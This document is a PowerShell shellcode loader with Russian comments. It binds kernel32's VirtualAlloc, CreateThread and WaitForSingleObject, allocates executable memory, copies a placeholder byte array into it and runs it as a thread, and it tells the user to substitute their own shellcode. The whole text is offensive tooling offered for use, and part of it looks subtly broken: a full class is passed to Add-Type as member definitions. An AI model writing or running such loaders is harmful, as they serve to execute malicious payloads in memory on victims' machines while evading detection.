$shellcode = [byte[]] (0x00,0x01,0x02) # Пример шеллкода, замените на свой

$pinvoke = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr attr, IntPtr stackSize, IntPtr startAddress, IntPtr param, IntPtr flags, ref IntPtr threadId);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
}
"@

Add-Type -MemberDefinition $pinvoke -Name "Win32" -Namespace "PInvoke"

$funcAddr = [PInvoke.Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $funcAddr, $shellcode.Length)

$threadId = 0
$threadHandle = [PInvoke.Win32]::CreateThread(0, 0, $funcAddr, 0, 0, [ref] $threadId)

[PInvoke.Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF) # Ожидание завершения потока